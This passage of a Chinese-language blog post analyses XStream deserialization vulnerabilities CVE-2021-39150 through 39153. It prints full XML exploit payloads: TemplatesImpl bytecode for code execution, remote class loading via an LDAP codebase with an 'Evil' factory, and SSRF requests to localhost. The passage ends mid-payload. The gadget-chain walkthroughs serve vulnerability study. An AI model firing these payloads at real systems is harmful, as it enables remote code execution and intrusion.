&lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">                    &lt;/__bytecodes&gt;</span><br><span class="line">                  &lt;/default&gt;</span><br><span class="line">                  &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">              &lt;/proxy&gt;</span><br><span class="line">              &lt;implementing__method&gt;</span><br><span class="line">                &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;getOutputProperties&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types/&gt;</span><br><span class="line">              &lt;/implementing__method&gt;</span><br><span class="line">            &lt;/sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/probes&gt;</span><br><span class="line">      &lt;/defaultHandler&gt;</span><br><span class="line">    &lt;/handler&gt;</span><br><span class="line">  &lt;/dynamic-proxy&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>这条利用链比较简单，通过HashMap触发key.hashCode方法，然后交由给CompositeInvocationHandlerImpl的invoke方法处理：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132219060.png" alt="image-20230413221939966"></p>
<p>先获取hashCode方法所属类Object，然后从classToInvocationHandler属性中查找是否有该类的handler，找不到就将defaultHandler默认处理器赋给handler，然后调用invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132223984.png" alt="image-20230413222320883"></p>
<p>在invoke方法中获取方法所属类Object，然后判断跟providerType属性是否相等，相等的话进入else分支调用triggerProbe方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132225997.png" alt="image-20230413222523911"></p>
<p>从属性probes中获取hashCode方法的ProbeSkeleton对象，然后调用uncheckedTrigger方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132228054.png" alt="image-20230413222813977"></p>
<p>执行TemplatesImpl的getOutputProperties方法，后面就是经典利用链了。</p>
<h2 id="CVE-2021-39150"><a href="#CVE-2021-39150" class="headerlink" title="CVE-2021-39150"></a>CVE-2021-39150</h2><h3 id="分析-27"><a href="#分析-27" class="headerlink" title="分析"></a>分析</h3><p>该漏洞导致SSRF，该链是39141的变种，简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;jdk.nashorn.internal.runtime.Source&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;readFully&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.net.URL&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这里回看<a href="#CVE-2021-39141">CVE-2021-39141</a>，不再赘述。差别就在MethodSetter执行的方法不一样，这里执行的是Source的readFully：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132300222.png" alt="image-20230413230023122"></p>
<p>直接发起URL连接，造成SSRF。</p>
<h2 id="CVE-2021-39151"><a href="#CVE-2021-39151" class="headerlink" title="CVE-2021-39151"></a>CVE-2021-39151</h2><h3 id="分析-28"><a href="#分析-28" class="headerlink" title="分析"></a>分析</h3><p>该漏洞也是远程加载类并实例化，链的后半部分与<a href="#CVE-2021-39145">CVE-2021-39145</a>完全相同，这里不再赘述，官方简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">&lt;javax.swing.event.EventListenerList serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;javax.swing.event.EventListenerList&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;listenerList&gt;</span><br><span class="line">        &lt;javax.swing.undo.UndoManager&gt;</span><br><span class="line">          &lt;hasBeenDone&gt;true&lt;/hasBeenDone&gt;</span><br><span class="line">          &lt;alive&gt;true&lt;/alive&gt;</span><br><span class="line">          &lt;inProgress&gt;true&lt;/inProgress&gt;</span><br><span class="line">          &lt;edits&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.api.message.Packet&gt;</span><br><span class="line">              &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                &lt;bodyParts/&gt;</span><br><span class="line">                &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                  &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">                    &lt;soapPart/&gt;</span><br><span class="line">                    &lt;mm&gt;</span><br><span class="line">                      &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                        &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                          &lt;entries&gt;</span><br><span class="line">                            &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                              &lt;DN&gt;cn=four,cn=three,cn=two,cn=one&lt;/DN&gt;</span><br><span class="line">                              &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                                  &lt;default /&gt;</span><br><span class="line">                                  &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;http://127.0.0.1:8080/&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;refObj&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                              &lt;/attributes&gt;</span><br><span class="line">                            &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                          &lt;/entries&gt;</span><br><span class="line">                          &lt;limit&gt;2&lt;/limit&gt;</span><br><span class="line">                          &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                          &lt;homeCtx /&gt;</span><br><span class="line">                          &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                          &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                        &lt;/aliases&gt;</span><br><span class="line">                      &lt;/it&gt;</span><br><span class="line">                    &lt;/mm&gt;</span><br><span class="line">                  &lt;/multiPart&gt;</span><br><span class="line">                &lt;/sm&gt;</span><br><span class="line">              &lt;/message&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.api.message.Packet&gt;</span><br><span class="line">          &lt;/edits&gt;</span><br><span class="line">        &lt;/javax.swing.undo.UndoManager&gt;</span><br><span class="line">      &lt;/listenerList&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;string&gt;java.lang.InternalError&lt;/string&gt;</span><br><span class="line">    &lt;javax.swing.undo.UndoManager reference=&#x27;../default/listenerList/javax.swing.undo.UndoManager&#x27;/&gt;</span><br><span class="line">  &lt;/javax.swing.event.EventListenerList&gt;</span><br><span class="line">&lt;/javax.swing.event.EventListenerList&gt;</span><br></pre></td></tr></table></figure>

<p>这里主要是通过什么去触发了Packet的toString方法很重要。</p>
<p>这里有个细节，当字符串使用加号拼接时，会使用StringBuilder将加号的每一个不是字符串的部分进行toString操作。</p>
<p>在EventListenerList的readObject方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141119074.png" alt="image-20230414111912940"></p>
<p>先读取default标签内容，然后读取java.lang.InternalError字符串，再然后读取UndoManager对象。加载InternalError的Class对象再调用add方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141121149.png" alt="image-20230414112134058"></p>
<p>由于UndoManager对象不是InternalError的实例，所以拼接字符串，准备抛异常，之前说过在拼接字符串时，内部会使用StringBuilder组装拼接的每个部分，将每个部分append到StringBuilder中，然后调用StringBuilder的toString方法返回完整的拼接好的字符串。</p>
<p>当append的是个对象时，会调用该对象的String.valueOf(obj)方法将该对象转成字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141126542.png" alt="image-20230414112658467"></p>
<p>valueOf方法也不过是调用对象的toString方法来将对象转成字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141128607.png" alt="image-20230414112827504"></p>
<p>这时候就进到UndoManager的toString方法了，在toString方法又调用父类的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141130779.png" alt="image-20230414113018661"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141131593.png" alt="image-20230414113108477"></p>
<p>有意思的是，在父类的toString方法中，同样又进行了字符串的拼接，这时候又会调用拼接部分的toString方法，即edits属性（Vector）的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141132917.png" alt="image-20230414113226823"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141134642.png" alt="image-20230414113447511"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141135611.png" alt="image-20230414113519506"></p>
<p>最后来到Vector父类AbstractCollection的toString方法。在该方法中，先取元素（Packet对象），然后再使用字符串拼接，这时候就来到Packet的toString了。后续利用链的话看<a href="#CVE-2021-39145">CVE-2021-39145</a>，减少重复分析。</p>
<h2 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h2><h3 id="分析-29"><a href="#分析-29" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成SSRF，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">      &lt;length&gt;0&lt;/length&gt;</span><br><span class="line">      &lt;lastModified&gt;0&lt;/lastModified&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference=&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">      &lt;length&gt;0&lt;/length&gt;</span><br><span class="line">      &lt;lastModified&gt;0&lt;/lastModified&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference=&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>从HashMap的put方法进：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141156271.png" alt="image-20230414115605195"></p>
<p>进入putVal方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141158067.png" alt="image-20230414115836976"></p>
<p>这里整个操作就是取下一个元素的键值，然后将当前元素的键值去跟下一个元素的键值比较。</p>
<p>这里就触发了URLData的equals方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141200926.png" alt="image-20230414120046845"></p>
<p>在equals方法中，调用loadMeta方法（确保被比较的元素不等于当前元素，同时元素是URLData的实例，同时两个元素的url属性相等，array属性为null）。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141203279.png" alt="image-20230414120303206"></p>
<p>在length和lastModified都为0的情况下，直接发起URL连接，造成SSRF。</p>
<h2 id="CVE-2021-39153"><a href="#CVE-2021-39153" class="headerlink" title="CVE-2021-39153"></a>CVE-2021-39153</h2><h3 id="分析-30"><a href="#分析-30" class="headerlink" title="分析"></a>分析</h3><p>该漏洞直接造成RCE，修正简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;com.sun.java.util.jar.pack.PackageWriter$2&#x27;&gt;</span><br><span class="line">        &lt;outer-class&gt;</span><br><span class="line">          &lt;attrIndexTable class=&#x27;com.sun.javafx.fxml.BeanAdapter&#x27;&gt;</span><br><span class="line">            &lt;bean class=&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">                  &lt;__bytecodes&gt;</span><br><span class="line">                    &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbG